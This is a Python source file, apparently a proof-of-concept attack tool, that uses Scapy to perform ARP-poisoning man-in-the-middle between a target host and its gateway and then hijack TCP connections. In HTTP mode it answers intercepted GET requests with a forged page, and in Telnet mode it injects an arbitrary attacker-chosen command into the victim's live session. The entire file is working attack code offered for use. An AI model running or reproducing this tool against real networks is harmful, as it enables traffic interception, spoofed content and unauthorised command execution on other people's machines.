from scapy.all import *
import argparse
import sys
import arp_poisoning
import globals


def forge_response(p, proto):
    # Switch direction of packet
    ether = Ether(src=p[Ether].dst, dst=p[Ether].src)
    ip = IP(src=p[IP].dst, dst=p[IP].src)
    tcp = TCP(sport=p[TCP].dport, dport=p[TCP].sport, seq=p[TCP].ack, ack=p[TCP].seq + 1, flags="AP")

    if proto == 'http':
        # Craft HTTP response

        # Fake webpage
        path = 'poc.html'
        page = open(path, 'r')
        html = page.read()

        # Response headers
        http = "HTTP /1.1 200 OK\n"
        http += "Server: Hacked!\n"
        http += "Content-Type: text/html\n"
        http += "Content-Length: " + str(len(html)) + "\n"
        http += "Connection: close"
        http += "\n\n"
        http += html

        response = ether / ip / tcp / http

    elif proto == 'telnet':

        print(f"Received: SEQ {p[TCP].seq}, ACK {p[TCP].ack}, Payload {p[TCP].payload}")

        ip_total_len = p[IP].len
        ip_header_len = p[IP].ihl * 32 // 8
        tcp_header_len = p[TCP].dataofs * 32 // 8
        tcp_seg_len = ip_total_len - ip_header_len - tcp_header_len

        # Send command to Telnet server
        cmd_ether = Ether(src=p[Ether].dst, dst=p[Ether].src)
        cmd_ip = IP(src=p[IP].dst, dst=p[IP].src)
        cmd_tcp = TCP(sport=p[TCP].dport, dport=p[TCP].sport, seq=p[TCP].ack, ack=p[TCP].seq + tcp_seg_len, flags="PA")

        command = '\r\n' + globals.CMD + '\r\n'
        cmd = cmd_ether / cmd_ip / cmd_tcp / command

        response = cmd

    else:
        # TODO other types
        response = ""

    return response


def hijack(p):

    if globals.PROTO == 'http':
        if 'GET' in str(p):
            response = forge_response(p, 'http')
            print('Spoofed Response: ', response.summary())
            sendp(response, verbose=0, iface=globals.IFACE)

    elif globals.PROTO == 'telnet':
        if globals.CMD not in str(p[TCP].payload):
            cmd = forge_response(p, 'telnet')
            print('Spoofed command: ', cmd[TCP].payload)

            print("[+] Executing command...")
            sendp(cmd, verbose=0, iface=globals.IFACE)

            sys.exit(0)


def main():
    
    parser = argparse.ArgumentParser()

    parser.add_argument(
        '-i', '--interface', default=conf.iface, help='Interface to use.'
    )

    parser.add_argument(
        'target', help='Target IP address.'
    )
    parser.add_argument(
        'gateway', help='Gateway IP address.'
    )

    subparsers = parser.add_subparsers(
        dest="proto", help="Higher level protocol to target.", required=True
    )

    http_subparser = subparsers.add_parser(
        'http', help='Perform HTTP connection hijacking.'
    )

    telnet_subparser = subparsers.add_parser(
        'telnet', help='Perform Telnet connection hijacking.'
    )

    telnet_subparser.add_argument(
        'cmd', help='A command to execute.'
    )

    args = parser.parse_args()

    globals.MY_MAC = get_if_hwaddr(args.interface)
    globals.MY_IP = get_if_addr(args.interface)
    globals.IFACE = args.interface

    print(f"My MAC: {globals.MY_MAC}\nMy IP: {globals.MY_IP}")
    print()

    print(f"[+] Determining target and gateway MAC address.")

    result = arp_poisoning.arp_scan(args.target, args.interface)
    if not result:
        print("\tCannot determine target MAC address. Are you sure the IP is correct?")
        sys.exit(1)
    else:
        targetMAC = result[0]['MAC']

    result = arp_poisoning.arp_scan(args.gateway, args.interface)
    if not result:
        print("\tCannot determine gateway MAC address. Are you sure the IP is correct?")
        sys.exit(1)
    else:
        gatewayMAC = result[0]['MAC']

    # Define packet forwarding source and destination
    globals.GATEWAY_MAC = gatewayMAC
    globals._SRC_DST = {
        gatewayMAC: targetMAC,
        targetMAC: gatewayMAC,
    }

    print(f"[+] Performing ARP poisoning MITM.")

    if args.proto == 'http':
        globals.PROTO = 'http'
        filter = f"ip and tcp port 80 and ether src {targetMAC}"

    elif args.proto == 'telnet':
        globals.PROTO = 'telnet'
        globals.CMD = args.cmd
        filter = f"ip and tcp port 23 and ether src {gatewayMAC}"

    arp_poisoning.arp_mitm(args.target, args.gateway, targetMAC, gatewayMAC, globals.MY_MAC, hijack, filter, args.interface)


if __name__ == '__main__':
    main()
